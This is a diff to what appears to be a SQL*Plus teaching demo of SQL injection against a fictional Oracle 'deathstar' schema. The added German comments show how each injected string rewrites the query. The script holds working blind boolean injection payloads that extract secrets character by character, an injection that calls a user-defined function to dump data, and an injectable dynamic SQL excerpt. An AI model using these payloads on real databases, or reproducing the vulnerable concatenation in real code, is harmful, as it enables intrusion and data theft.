@@ -23,6 +23,12 @@ connect sabine/sabine
 
 select deathstar.room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''a'') --') result from dual;
 #pause
+/* Wird zu:
+select * from deathstar_rooms
+   where lower(name) like lower('%')
+   and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = 'a') --
+ */
+#pause
 select deathstar.room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''b'') --') result from dual;
 #pause
 select deathstar.room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''c'') --') result from dual;
@@ -79,6 +85,16 @@ cl scr
 connect deathstar/deathstar
 cl scr
 select code from deathstar.deathstar_rooms;
+#pause
+cl scr
+/* Auszug aus ALLOW_ROOM_ACCESS:
+execute immediate '
+  begin
+    insert into ' || dbms_assert.simple_sql_name(l_log_table) || ' ( message )
+      values (''User ' || i_user_id || ' has now access to room ' || l_room_code || ''');
+  end;
+';
+ */
 
 #pause
 cl scr
@@ -131,6 +147,12 @@ select * from secret_dump;
 cl scr
 
 select deathstar.room_info.get_room_id(''') and sabine.bad_func() = ''Y''--') from dual;
+/* Wird zu:
+select * from deathstar_rooms
+   where lower(name) like lower('%')
+   and sabine.bad_func() = 'Y' --
+ */
+#pause
 
 select * from secret_dump;
 #pause
